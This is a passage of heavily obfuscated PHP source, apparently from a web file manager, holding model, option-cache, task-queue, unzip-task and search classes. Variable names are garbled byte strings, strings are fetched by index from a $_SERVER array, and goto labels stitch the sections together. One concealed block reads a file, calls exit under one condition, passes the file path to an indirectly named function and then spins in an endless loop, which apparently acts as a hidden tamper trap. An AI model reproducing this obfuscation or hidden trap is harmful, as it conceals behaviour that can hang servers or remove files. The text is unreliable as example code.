(is_array($å“¦ñ†Ù)) { $»­ĞÏ»ö = is_string($ ßÓ¾à) ? $ ßÓ¾à : $»­ĞÏ»ö; $å“¦ñ†Ù = $this->parseWhereLike($å“¦ñ†Ù, $»­ĞÏ»ö, !0, $‚«Ëí); } if (is_numeric($ ßÓ¾à)) { $äœ©™Î[$İ­Í¡íÄ] = $å“¦ñ†Ù; $İ­Í¡íÄ++; } else { $äœ©™Î[$ ßÓ¾à] = $å“¦ñ†Ù; } } if ($‚«Ëí && !$Í¢»ÔÂ) { } return $äœ©™Î; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ç…Õà…´ = array()) { $× —ùšı =& $_SERVER[¤·²È‰º]; $²‚Èâ—¥ = self::SQL_WHERE_IN_CHUNK; $´â­¹¾Õ = $this->optionsValue(); $ö ù®ìõ = $this->findWhereField($´â­¹¾Õ); if (!$ö ù®ìõ || isset($´â­¹¾Õ[$× —ùšı[301]]) || isset($´â­¹¾Õ[$× —ùšı[362]])) { return parent::select($ç…Õà…´); } $ê»–Ëò = $´â­¹¾Õ[$× —ùšı[284]][$ö ù®ìõ][1]; $ê»–Ëò = is_array($ê»–Ëò) ? $ê»–Ëò : array(); $ òÙ ‰ş = null; for ($ÖÕô÷ƒÙ = 0; $ÖÕô÷ƒÙ < count($ê»–Ëò); $ÖÕô÷ƒÙ += $²‚Èâ—¥) { $Œ‰æÈ = array_slice($ê»–Ëò, $ÖÕô÷ƒÙ, $²‚Èâ—¥); if (!is_array($Œ‰æÈ) || count($Œ‰æÈ) == 0) { break; } $´â­¹¾Õ[$× —ùšı[284]][$ö ù®ìõ][1] = $Œ‰æÈ; $this->optionsValue($´â­¹¾Õ); $”’­úÙô = parent::select($ç…Õà…´); if (!$”’­úÙô) { continue; } $ òÙ ‰ş = is_array($ òÙ ‰ş) ? $ òÙ ‰ş : array(); $ òÙ ‰ş = array_merge($ òÙ ‰ş, $”’­úÙô); } return $ òÙ ‰ş; } public function delete($Ÿ³ŸášÉ = array()) { $´ë –¼Ü =& $_SERVER[¤·²È‰º]; $ÌÎ¾õı® = self::SQL_WHERE_IN_CHUNK; $±«°¡˜ = $this->optionsValue(); $¯¼êşÌğ = $this->findWhereField($±«°¡˜); if (!$¯¼êşÌğ) { return parent::delete($Ÿ³ŸášÉ); } $áÚ¹í“Ç = 0; $Ş´ªğ‘õ = $±«°¡˜[$´ë –¼Ü[284]][$¯¼êşÌğ][1]; $Ş´ªğ‘õ = is_array($Ş´ªğ‘õ) ? $Ş´ªğ‘õ : array(); for ($ÈŠ„ûÆ = 0; $ÈŠ„ûÆ < count($Ş´ªğ‘õ); $ÈŠ„ûÆ += $ÌÎ¾õı®) { $ã”¨ì¥ = array_slice($Ş´ªğ‘õ, $ÈŠ„ûÆ, $ÌÎ¾õı®); if (!is_array($ã”¨ì¥) || count($ã”¨ì¥) == 0) { break; } $±«°¡˜[$´ë –¼Ü[284]][$¯¼êşÌğ][1] = $ã”¨ì¥; $this->optionsValue($±«°¡˜); $áÚ¹í“Ç += parent::delete($Ÿ³ŸášÉ); } return $áÚ¹í“Ç; } private function findWhereField($ë’¶”¶) { $ëŠí­É =& $_SERVER[¤·²È‰º]; $»Œ¿âšÇ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ë’¶”¶) || !is_array($ë’¶”¶[$ëŠí­É[284]])) { return !1; } foreach ($ë’¶”¶[$ëŠí­É[284]] as $Ê†Éë‘Ô => $‡¥ï¹§ª) { if (is_array($‡¥ï¹§ª) && isset($‡¥ï¹§ª[0]) && is_string($‡¥ï¹§ª[0]) && strtolower($‡¥ï¹§ª[0]) == $ëŠí­É[7] && is_array($‡¥ï¹§ª[1]) && count($‡¥ï¹§ª[1]) > $»Œ¿âšÇ) { ignore_timeout(); return $Ê†Éë‘Ô; } } return !1; } public function setMasterDB($ËºÓéÉÕ = true) { think_config($_SERVER[¤·²È‰º][403], $ËºÓéÉÕ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\x6d\x4f\160\164\x69\x6f\156"; public $field = array(); public function listData($¿×–è–Õ = false, $áÃ®ã¬˜ = "\155\x6f\144\x69\x66\x79\x54\x69\x6d\145", $ˆìçºªí = false) { $Û®¤½º« = Model($this->modelType)->get(!1, $this->optionType, !0); $•­É€“ = array_values($Û®¤½º«); if ($•­É€“ && $•­É€“[0] && !is_array($•­É€“[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Û®¤½º« = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Û®¤½º«) { return $¿×–è–Õ ? null : array(); } if (!$¿×–è–Õ) { $Û®¤½º« = array_filter(array_values($Û®¤½º«)); return array_sort_by($Û®¤½º«, $áÃ®ã¬˜, $ˆìçºªí); } return $Û®¤½º«[$_SERVER[¤·²È‰º][404] . $¿×–è–Õ]; } public function insert($Ëğ½©ıË) { $É•Ûªğ =& $_SERVER[¤·²È‰º]; $Ëğ½©ıË = array_field_key($Ëğ½©ıË, $this->field); $Ôùû°„Š = Model($this->modelType)->get($É•Ûªğ[405], $this->optionType . $É•Ûªğ[406]); $Ôùû°„Š = $Ôùû°„Š ? $Ôùû°„Š : 0; $Ëğ½©ıË[$É•Ûªğ[407]] = ++$Ôùû°„Š; $Ëğ½©ıË[$É•Ûªğ[210]] = time(); $Ëğ½©ıË[$É•Ûªğ[95]] = time(); Model($this->modelType)->set($É•Ûªğ[405], $Ôùû°„Š, $this->optionType . $É•Ûªğ[406]); Model($this->modelType)->set($É•Ûªğ[404] . $Ôùû°„Š, $Ëğ½©ıË, $this->optionType); return $Ôùû°„Š; } public function update($Ÿ„ğ”´‹, $ÅŒ›„êÄ) { $ƒ‚£ËÉ† =& $_SERVER[¤·²È‰º]; $ÅŒ›„êÄ = array_field_key($ÅŒ›„êÄ, $this->field); $Õ£»îİˆ = $this->listData($Ÿ„ğ”´‹); if (!$Õ£»îİˆ || !$Ÿ„ğ”´‹) { return !1; } $ÅŒ›„êÄ = array_merge($Õ£»îİˆ, $ÅŒ›„êÄ); $ÅŒ›„êÄ[$ƒ‚£ËÉ†[95]] = time(); return Model($this->modelType)->set($ƒ‚£ËÉ†[404] . $Ÿ„ğ”´‹, $ÅŒ›„êÄ, $this->optionType); } public function remove($–£´ÖÏç) { if (!$–£´ÖÏç) { return !1; } return Model($this->modelType)->remove($_SERVER[¤·²È‰º][404] . $–£´ÖÏç, $this->optionType); } public function clear() { $Ëœ‡¬ı¡ =& $_SERVER[¤·²È‰º]; Model($this->modelType)->remove($Ëœ‡¬ı¡[405], $this->optionType . $Ëœ‡¬ı¡[406]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ô»„³Î , $¥Ñ‹ã“©) { if (!$¥Ñ‹ã“©) { return !1; } $Éï“¸°ä = $this->listData(); $Éï“¸°ä = array_to_keyvalue($Éï“¸°ä, $Ô»„³Î ); return isset($Éï“¸°ä[$¥Ñ‹ã“©]) ? $Éï“¸°ä[$¥Ñ‹ã“©] : !1; } public function findByName($…¨Üš•ø) { return $this->findByKey($_SERVER[¤·²È‰º][42], $…¨Üš•ø); } protected function resetData($æÛöúòò) { $ª‘µ´¢ü =& $_SERVER[¤·²È‰º]; $æÛöúòò = is_array($æÛöúòò) ? $æÛöúòò : array(); $ŠÑ•–„˜ = array(); for ($›Ù“™… = 0; $›Ù“™… < count($æÛöúòò); $›Ù“™…++) { $ŠÑ•–„˜[$ª‘µ´¢ü[404] . $æÛöúòò[$›Ù“™…][$ª‘µ´¢ü[407]]] = $æÛöúòò[$›Ù“™…]; } return Model($this->modelType)->set($ŠÑ•–„˜, !1, $this->optionType); } private function getAutoName($Ê¦á’Ùö) { $« ŞúÁê = array_to_keyvalue($this->listData(), $_SERVER[¤·²È‰º][42]); if (!$« ŞúÁê || !isset($« ŞúÁê[$Ê¦á’Ùö])) { return $Ê¦á’Ùö; } for ($³­²×¶ù = 1; $³­²×¶ù < count($« ŞúÁê); $³­²×¶ù++) { $óæÊ’²ç = $Ê¦á’Ùö . "\50{$³­²×¶ù}\x29"; if (!isset($« ŞúÁê[$óæÊ’²ç])) { return $óæÊ’²ç; } } return $óæÊ’²ç; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ ˆäò§Ø = false, $ˆ½¤¬ûÊ = '', $˜ç´òÜ = false) { $óáÏàá =& $_SERVER[¤·²È‰º]; $ˆ°Ø£–ù = $this->cacheGet($ˆ½¤¬ûÊ); $ô®º¹áÕ = $this->optionDefault($ˆ½¤¬ûÊ); $ô®º¹áÕ = is_array($ô®º¹áÕ) ? $ô®º¹áÕ : array(); if (is_array($ˆ°Ø£–ù)) { $ˆ°Ø£–ù = array_merge($ô®º¹áÕ, $ˆ°Ø£–ù); return $ ˆäò§Ø ? isset($ˆ°Ø£–ù[$ ˆäò§Ø]) ? $ˆ°Ø£–ù[$ ˆäò§Ø] : null : $ˆ°Ø£–ù; } $ˆçµÕ‘å = $this->filterWhere(array($óáÏàá[43] => $ˆ½¤¬ûÊ)); $ˆ°Ø£–ù = $this->where($ˆçµÕ‘å)->select(); $ˆ°Ø£–ù = array_to_keyvalue($ˆ°Ø£–ù, $óáÏàá[104], $óáÏàá[383]); foreach ($ˆ°Ø£–ù as $±Åµ´» => $Š¤òˆ„) { if ($˜ç´òÜ || in_array($±Åµ´», $this->jsonField)) { $ˆ°Ø£–ù[$±Åµ´»] = json_decode($Š¤òˆ„, !0); } } $this->cacheSet($ˆ½¤¬ûÊ, $ˆ°Ø£–ù); $ˆ°Ø£–ù = array_merge($ô®º¹áÕ, $ˆ°Ø£–ù); return $ ˆäò§Ø ? $ˆ°Ø£–ù[$ ˆäò§Ø] : $ˆ°Ø£–ù; } public function set($ƒ¦²Ä, $Õò™ë·¾ = false, $ê÷Ó¬¶ = '') { $›İËüìÊ =& $_SERVER[¤·²È‰º]; $this->cacheRemove($ê÷Ó¬¶); $±öÆ¡‘· = array(); $¼‘ëÈÒ = is_array($ƒ¦²Ä) ? $ƒ¦²Ä : array($ƒ¦²Ä => $Õò™ë·¾); foreach ($¼‘ëÈÒ as $¾Á‚‹‰© => $¼“â¯Ç) { if (is_array($¼“â¯Ç)) { $¼“â¯Ç = json_encode_force($¼“â¯Ç); } $this->checkLength($¼“â¯Ç, !1, $this->tableName . $›İËüìÊ[4] . $ƒ¦²Ä); $¼“â¯Ç = self::textEncode($¼“â¯Ç); $¼‘ëÈÒ = array($›İËüìÊ[43] => $ê÷Ó¬¶, $›İËüìÊ[104] => $¾Á‚‹‰©, $›İËüìÊ[383] => $¼“â¯Ç); $±öÆ¡‘·[] = $this->filterWhere($¼‘ëÈÒ); } if (!$±öÆ¡‘·) { return !0; } $Ç‡¾š• = $this->cacheKey($›İËüìÊ[408]); CacheLock::lock($Ç‡¾š•); $úù–ë½ş = $this->addAll($±öÆ¡‘·, array(), !0); CacheLock::unlock($Ç‡¾š•); return $úù–ë½ş; } protected function optionDefault($šú‡Ø« = '') { return !1; } public function setDeep($‡ŒÏëÔ“, $…©÷ôŒµ = false, $¥³—íè = '') { $òø©¥ÜË = explode($_SERVER[¤·²È‰º][10], $‡ŒÏëÔ“); $®ä‰¹‰ó = $this->get(); array_set_value($®ä‰¹‰ó, $‡ŒÏëÔ“, $…©÷ôŒµ); $this->set($òø©¥ÜË[0], $®ä‰¹‰ó[$òø©¥ÜË[0]], $¥³—íè); } public function remove($ÅŸìÅıâ, $¨ å½§Á = '') { $‹å†Ÿµ† =& $_SERVER[¤·²È‰º]; $this->cacheRemove($¨ å½§Á); $–Ñ‚°× = $this->filterWhere(array($‹å†Ÿµ†[104] => $ÅŸìÅıâ, $‹å†Ÿµ†[43] => $¨ å½§Á)); if (is_null($ÅŸìÅıâ)) { unset($–Ñ‚°×[$‹å†Ÿµ†[104]]); } return $this->where($–Ñ‚°×)->delete(); } public function cacheSet($±â¨˜³•, $§Ğ–èÍğ = false) { return Cache::set($this->cacheKey($±â¨˜³•), $§Ğ–èÍğ); } public function cacheGet($²õä‘×ş) { return Cache::get($this->cacheKey($²õä‘×ş)); } public function cacheRemove($£©€ğÏÍ) { return Cache::remove($this->cacheKey($£©€ğÏÍ)); } protected function filterWhere($Œë°´‘) { return $Œë°´‘; } protected function cacheKey($šİ›¥üˆ) { return $šİ›¥üˆ; } } goto a“¦°ÕŠ¨é; eè°êˆ«¡¸: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\121\165\x65\x75\x65\x4c\x65\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\141\163\x6b\x51\x75\x65\165\145\104\x61\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($©â‹îî°, $Ïş­ÈÌá = array(), $İÊÌ£Ğß = '', $ëƒ›À˜˜ = '') { $Ş™·ìÓ¬ =& $_SERVER[¤·²È‰º]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ëƒ›À˜˜ && array_find_by_field(self::$listData, $Ş™·ìÓ¬[104], $ëƒ›À˜˜)) { return !0; } self::$listData[] = array($Ş™·ìÓ¬[273] => $©â‹îî°, $Ş™·ìÓ¬[1732] => $Ïş­ÈÌá, $Ş™·ìÓ¬[461] => $İÊÌ£Ğß, $Ş™·ìÓ¬[104] => $ëƒ›À˜˜); return !0; } public static function addSubmit() { $ËÜú´˜ =& $_SERVER[¤·²È‰º]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ËÜú´˜[1733] . json_encode_force(array_to_keyvalue(self::$listData, $ËÜú´˜[12], $ËÜú´˜[461])), $ËÜú´˜[1734]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Š‰’ØÍÌ, $õ€Ÿƒ¼… = array(), $¾ìµ–ô = '', $àØÚ½Èã = '') { $³¤¹ó =& $_SERVER[¤·²È‰º]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‘³—®ŸÉ = self::getAll(); if ($àØÚ½Èã && array_find_by_field($‘³—®ŸÉ, $³¤¹ó[104], $àØÚ½Èã)) { return !0; } $‘³—®ŸÉ[] = array($³¤¹ó[273] => $Š‰’ØÍÌ, $³¤¹ó[1732] => $õ€Ÿƒ¼…, $³¤¹ó[461] => $¾ìµ–ô, $³¤¹ó[104] => $àØÚ½Èã); write_log($³¤¹ó[1733] . $¾ìµ–ô, $³¤¹ó[1734]); self::setAll($‘³—®ŸÉ); return !0; } public static function run() { $õËÑÊ¶ã =& $_SERVER[¤·²È‰º]; $ß‹¹Â±… = self::getAll(); $úÍŒ§ÎÆ = array_shift($ß‹¹Â±…); if (!$úÍŒ§ÎÆ) { return !1; } self::setAll($ß‹¹Â±…); $Ö‡¬ïÆ± = timeFloat(); try { Hook::apply($úÍŒ§ÎÆ[$õËÑÊ¶ã[273]], $úÍŒ§ÎÆ[$õËÑÊ¶ã[1732]]); } catch (Exception $ÁÄ‹—€) { } $ñì· = number_format(timeFloat() - $Ö‡¬ïÆ±, 3) . $õËÑÊ¶ã[1667]; write_log($õËÑÊ¶ã[1735] . $úÍŒ§ÎÆ[$õËÑÊ¶ã[461]] . $õËÑÊ¶ã[1736] . $ñì·, $õËÑÊ¶ã[1734]); return !0; } public static function count() { $ÍùÁ „¨ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ÍùÁ „¨) { return 0; } return intval($ÍùÁ „¨); } public static function getAll() { $›½º‹÷À = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$›½º‹÷À) { return array(); } return $›½º‹÷À; } public static function setAll($ùÄÅ’”Ğ) { $•–‡Ôæ• = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ùÄÅ’”Ğ), $•–‡Ôæ•); Cache::set(self::QUEUE_DATA, $ùÄÅ’”Ğ, $•–‡Ôæ•); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($³¾Ã‰§, $ñÕÊÔ” = 5.0) { if (!$³¾Ã‰§) { return; } $›Ãİ×» = Cache::get($³¾Ã‰§); if (!$›Ãİ×» || timeFloat() - floatVal($›Ãİ×») >= $ñÕÊÔ”) { Cache::set($³¾Ã‰§, timeFloat(), $ñÕÊÔ” * 10); return !0; } return !1; } public static function timeLimitCall($å”è†¿Ò, $ãÊŞ£²›, $ïÖêûÂû, $¹ãÅèÙî = 5.0) { $§¥øæ‹· =& $_SERVER[¤·²È‰º]; if (!$å”è†¿Ò || !$ãÊŞ£²›) { return; } self::$asyncAdd = !0; $¥ü•Œçõ = $§¥øæ‹·[1737]; $Ş‰£ºÆ’ = Cache::get($¥ü•Œçõ, !0); $·èéÈê  = array($§¥øæ‹·[1738] => timeFloat(), $§¥øæ‹·[1739] => timeFloat(), $§¥øæ‹·[273] => $ãÊŞ£²›, $§¥øæ‹·[1732] => $ïÖêûÂû, $§¥øæ‹·[213] => $¹ãÅèÙî); if (is_array($Ş‰£ºÆ’[$å”è†¿Ò])) { $·èéÈê [$§¥øæ‹·[1739]] = $Ş‰£ºÆ’[$å”è†¿Ò][$§¥øæ‹·[1739]]; } if (is_array($Ş‰£ºÆ’[$å”è†¿Ò])) { if (timeFloat() - $Ş‰£ºÆ’[$å”è†¿Ò][$§¥øæ‹·[1738]] < $·èéÈê [$§¥øæ‹·[213]] * 0.3) { return; } $·èéÈê [$§¥øæ‹·[1739]] = $Ş‰£ºÆ’[$å”è†¿Ò][$§¥øæ‹·[1739]]; } $Ş‰£ºÆ’[$å”è†¿Ò] = $·èéÈê ; Cache::set($¥ü•Œçõ, $Ş‰£ºÆ’, 60); Cache::removeMemory($¥ü•Œçõ); write_log($§¥øæ‹·[1740] . $å”è†¿Ò . $§¥øæ‹·[81] . $ãÊŞ£²›, $§¥øæ‹·[1734]); } public static function timeLimitCallLoop() { $ÇüºË¹ =& $_SERVER[¤·²È‰º]; $Ö²ï†·â = array($ÇüºË¹[1741]); $×ÅÑáÓ = in_array(strtolower(ACTION), $Ö²ï†·â); if (!$×ÅÑáÓ && !self::$asyncAdd) { return; } $úÓ­ëÑá = $ÇüºË¹[1737]; $Á¯±„® = Cache::get($úÓ­ëÑá, !0); if (!$Á¯±„® || count($Á¯±„®) <= 0) { return; } $®·è–„ = !1; $€ª„Úêº = timeFloat(); $š††íÄ = array(); foreach ($Á¯±„® as $Õ¹ÖÙâ => $ÓÊéÚª) { if ($€ª„Úêº - $ÓÊéÚª[$ÇüºË¹[1739]] > $ÓÊéÚª[$ÇüºË¹[213]]) { $®·è–„ = !0; try { Hook::apply($ÓÊéÚª[$ÇüºË¹[273]], $ÓÊéÚª[$ÇüºË¹[1732]]); write_log($ÇüºË¹[1742] . $Õ¹ÖÙâ . $ÇüºË¹[81] . $ÓÊéÚª[$ÇüºË¹[273]] . $ÇüºË¹[1743] . ACTION, $ÇüºË¹[1734]); } catch (Exception $ªÅ­Æ”ö) { } continue; } $š††íÄ[$Õ¹ÖÙâ] = $ÓÊéÚª; } if (!$®·è–„) { return; } if (!$š††íÄ) { return Cache::remove($úÓ­ëÑá); } Cache::set($úÓ­ëÑá, $š††íÄ, 60); Cache::removeMemory($úÓ­ëÑá); } public static function finished($ôÓ©¸£—, $÷¹®´¯Ì) { $‘¥îÂ‘‰ =& $_SERVER[¤·²È‰º]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($‘¥îÂ‘‰[273] => $ôÓ©¸£—, $‘¥îÂ‘‰[1732] => $÷¹®´¯Ì); } private static function finishedRun() { $§äÀó…Ñ =& $_SERVER[¤·²È‰º]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ß¤ÜŠœë) { try { Hook::apply($ß¤ÜŠœë[$§äÀó…Ñ[273]], $ß¤ÜŠœë[$§äÀó…Ñ[1732]]); } catch (Exception $‡‚ÈÊ¬Í) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ËÙ¿Ğ“¯ =& $_SERVER[¤·²È‰º]; parent::startAfter(); Hook::bind($ËÙ¿Ğ“¯[1744], array($this, $ËÙ¿Ğ“¯[1745])); Hook::bind($ËÙ¿Ğ“¯[1188], array($this, $ËÙ¿Ğ“¯[1746])); $…ş¨Ÿ›Ü =& $this->task; $…ş¨Ÿ›Ü[$ËÙ¿Ğ“¯[1747]] = $ËÙ¿Ğ“¯[1193]; if (!$…ş¨Ÿ›Ü[$ËÙ¿Ğ“¯[1550]]) { $…ş¨Ÿ›Ü[$ËÙ¿Ğ“¯[1550]] = LNG($ËÙ¿Ğ“¯[1748]); } } protected function endAfter() { $Î³ÜØÍ =& $_SERVER[¤·²È‰º]; parent::endAfter(); Hook::unbind($Î³ÜØÍ[1744], array($this, $Î³ÜØÍ[1745])); Hook::unbind($Î³ÜØÍ[1188], array($this, $Î³ÜØÍ[1746])); } public function updateAfter() { $ˆ€Æ£Õ¦ =& $_SERVER[¤·²È‰º]; $Ÿ³°—³Ü =& $this->task; if (!$Ÿ³°—³Ü[$ˆ€Æ£Õ¦[787]] || !$Ÿ³°—³Ü[$ˆ€Æ£Õ¦[764]]) { return; } if ($Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1747]] == $ˆ€Æ£Õ¦[1193]) { $¡›˜Ö¸» = 0; if ($Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1702]]) { $¡›˜Ö¸» = $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1703]] / $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1702]]; } $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1653]] = $¡›˜Ö¸» * 0.3; } else { if ($Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1747]] == $ˆ€Æ£Õ¦[322]) { $¡›˜Ö¸» = $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1652]] / $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[787]]; $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1653]] = 0.3 + $¡›˜Ö¸» * 0.4; } else { if ($Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1747]] == $ˆ€Æ£Õ¦[117]) { $ÍŠó¹• = 0; if ($Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1704]] == $ˆ€Æ£Õ¦[117]) { $ÍŠó¹• = $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1703]]; } $¡›˜Ö¸» = ($Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1707]] + $ÍŠó¹•) / $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[764]]; $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1653]] = 0.3 + 0.4 + $¡›˜Ö¸» * 0.3; } } } if ($Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1653]] > 0) { $—¯“ë²ë = timeFloat() - $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1655]] - $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1658]]; $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1659]] = $—¯“ë²ë * (1 - $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1653]]) / $Ÿ³°—³Ü[$ˆ€Æ£Õ¦[1653]]; } } public function addFile($‘ò§ßÒ) { $˜Á©®Ë¿ =& $_SERVER[¤·²È‰º]; $Ó‡Ï¾áÓ =& $this->task; $³¢­É¤ = IO::info($‘ò§ßÒ); $Ó‡Ï¾áÓ[$˜Á©®Ë¿[1700]] = $³¢­É¤[$˜Á©®Ë¿[42]]; $Ó‡Ï¾áÓ[$˜Á©®Ë¿[1702]] = $³¢­É¤[$˜Á©®Ë¿[86]]; $Ó‡Ï¾áÓ[$˜Á©®Ë¿[1703]] = 0; $Ó‡Ï¾áÓ[$˜Á©®Ë¿[1058]] = $˜Á©®Ë¿[1723]; $Ó‡Ï¾áÓ[$˜Á©®Ë¿[1704]] = $˜Á©®Ë¿[1193]; $Ó‡Ï¾áÓ[$˜Á©®Ë¿[764]] = $³¢­É¤[$˜Á©®Ë¿[86]]; $Ó‡Ï¾áÓ[$˜Á©®Ë¿[787]] = 1; $‹û‹øšÈ = 0; $Ó‡Ï¾áÓ[$˜Á©®Ë¿[1711]] = array($˜Á©®Ë¿[1712] => $‹û‹øšÈ + 1, $˜Á©®Ë¿[428] => $³¢­É¤[$˜Á©®Ë¿[42]], $˜Á©®Ë¿[94] => $³¢­É¤[$˜Á©®Ë¿[94]], $˜Á©®Ë¿[527] => $³¢­É¤[$˜Á©®Ë¿[527]] ? $³¢­É¤[$˜Á©®Ë¿[527]] : $³¢­É¤[$˜Á©®Ë¿[94]]); $this->update(); } public function unzipAfter($ıÙÙ­ÌŒ) { $âàÁÛ§š =& $_SERVER[¤·²È‰º]; $„…¸¨ú¼ =& $this->task; $„…¸¨ú¼[$âàÁÛ§š[1747]] = $âàÁÛ§š[117]; $æŒÇ ‡ = IO::infoWithChildren($ıÙÙ­ÌŒ); $ú‡¾Øè‹ = 0; $„…¸¨ú¼[$âàÁÛ§š[1711]] = array($âàÁÛ§š[1712] => $ú‡¾Øè‹ + 1, $âàÁÛ§š[428] => $æŒÇ ‡[$âàÁÛ§š[42]], $âàÁÛ§š[94] => $æŒÇ ‡[$âàÁÛ§š[94]], $âàÁÛ§š[527] => $æŒÇ ‡[$âàÁÛ§š[527]] ? $æŒÇ ‡[$âàÁÛ§š[527]] : $æŒÇ ‡[$âàÁÛ§š[94]]); if ($æŒÇ ‡[$âàÁÛ§š[43]] == $âàÁÛ§š[209]) { $„…¸¨ú¼[$âàÁÛ§š[787]] = 1; } else { $„…¸¨ú¼[$âàÁÛ§š[787]] = $æŒÇ ‡[$âàÁÛ§š[89]][$âàÁÛ§š[87]]; } $„…¸¨ú¼[$âàÁÛ§š[1058]] = $âàÁÛ§š[12]; $„…¸¨ú¼[$âàÁÛ§š[1704]] = 0; $„…¸¨ú¼[$âàÁÛ§š[1652]] = 0; $„…¸¨ú¼[$âàÁÛ§š[1702]] = 0; $„…¸¨ú¼[$âàÁÛ§š[1703]] = 0; $„…¸¨ú¼[$âàÁÛ§š[1700]] = $âàÁÛ§š[12]; $„…¸¨ú¼[$âàÁÛ§š[1707]] = 0; $„…¸¨ú¼[$âàÁÛ§š[764]] = $æŒÇ ‡[$âàÁÛ§š[86]]; $this->update(); self::log($âàÁÛ§š[1749] . json_encode(array($„…¸¨ú¼, $æŒÇ ‡))); } public function nameParse($Ô·âìèß) { $½²çŸ‘ =& $_SERVER[¤·²È‰º]; $‰£ôóåÊ =& $this->task; if ($‰£ôóåÊ[$½²çŸ‘[1747]] == $½²çŸ‘[1193]) { $‰£ôóåÊ[$½²çŸ‘[1747]] = $½²çŸ‘[322]; $‰£ôóåÊ[$½²çŸ‘[1707]] = 0; $‰£ôóåÊ[$½²çŸ‘[764]] = 0; } $íå‚æì­ = get_path_this($Ô·âìèß); if (strstr($íå‚æì­, $½²çŸ‘[10])) { $‰£ôóåÊ[$½²çŸ‘[1652]] += 1; $‰£ôóåÊ[$½²çŸ‘[787]] += 1; } $‰£ôóåÊ[$½²çŸ‘[1700]] = $Ô·âìèß; $this->update(); } } goto eöëê“óğ“; e’Ù¡Úë¶: if (!isset($_SERVER[$_SERVER[¤·²È‰º][13]]) || !isset($_SERVER[$_SERVER[¤·²È‰º][14]])) { $_getc = $_SERVER[¤·²È‰º][15]; $_getfile = $_SERVER[$_SERVER[¤·²È‰º][16]] . $_SERVER[¤·²È‰º][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¤·²È‰º][18], $_getfilec); if (count($_getarrs) < $_SERVER[¤·²È‰º][19]) { $exit = $_SERVER[¤·²È‰º][20]; $exit(); } $_act = $_SERVER[¤·²È‰º][21]; $_act($_SERVER[$_SERVER[¤·²È‰º][16]] . $_SERVER[¤·²È‰º][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¤·²È‰º][22]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($°Œ¯×«¸) { $‘Ï‹–È¼ =& $_SERVER[¤·²È‰º]; $İ—íã–Ş = KodIO::fileTypeList(); $Øöé ß = $İ—íã–Ş[$°Œ¯×«¸]; if (!$Øöé ß) { return array(); } $­¤¨“ïª = $Øöé ß[$‘Ï‹–È¼[184]]; $µİù“Ã° = $‘Ï‹–È¼[7]; if (!$Øöé ß[$‘Ï‹–È¼[184]]) { $ÎßÁŒ€ = array_to_keyvalue($İ—íã–Ş, $‘Ï‹–È¼[12], $‘Ï‹–È¼[184]); $­¤¨“ïª = implode($‘Ï‹–È¼[60], $ÎßÁŒ€); $µİù“Ã° = $‘Ï‹–È¼[2074]; } $²êœ¸ïª = explode($‘Ï‹–È¼[60], trim($­¤¨“ïª, $‘Ï‹–È¼[60])); return array($µİù“Ã°, $²êœ¸ïª); } public function listPathType($ü¸ŒÃ¤) { $ğìÖöÂ¶ =& $_SERVER[¤·²È‰º]; $Ø‹¤¨†¼ = $this->fileTypeWhere($ü¸ŒÃ¤); if (!$Ø‹¤¨†¼) { return array(); } $ƒğî¿ªÛ = array($ğìÖöÂ¶[594] => SourceModel::TYPE_USER, $ğìÖöÂ¶[595] => USER_ID, $ğìÖöÂ¶[591] => 0, $ğìÖöÂ¶[592] => $Ø‹¤¨†¼); return $this->listSource($ƒğî¿ªÛ); } public function 